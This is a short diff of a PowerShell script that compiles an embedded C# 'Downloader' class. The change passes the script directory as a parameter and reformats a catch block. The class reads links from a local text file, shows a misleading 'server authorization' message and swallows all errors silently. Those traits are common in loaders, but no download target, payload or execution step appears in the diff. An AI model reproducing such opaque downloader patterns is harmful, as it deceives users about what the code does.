@@ -7,13 +7,12 @@ using System.Net;
 
 public class Downloader
 {
-    public static void Run()
+    public static void Run(string scriptDir)
     {
         try
         {
             Console.WriteLine("Processing server authorization, please wait...");
 
-            string scriptDir = AppDomain.CurrentDomain.BaseDirectory;
             string linkFile = Path.Combine(scriptDir, "output1.txt");
 
             if (!File.Exists(linkFile))
@@ -55,7 +54,10 @@ public class Downloader
                 }
             }
         }
-        catch { }
+        catch 
+        {
+
+        }
     }
 }
 "@
@@ -67,4 +69,5 @@ Add-Type -TypeDefinition $source -Language CSharp -ReferencedAssemblies @(
     "System.IO.Compression.FileSystem.dll"
 )
 
-[Downloader]::Run()
+$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+[Downloader]::Run($scriptDir)
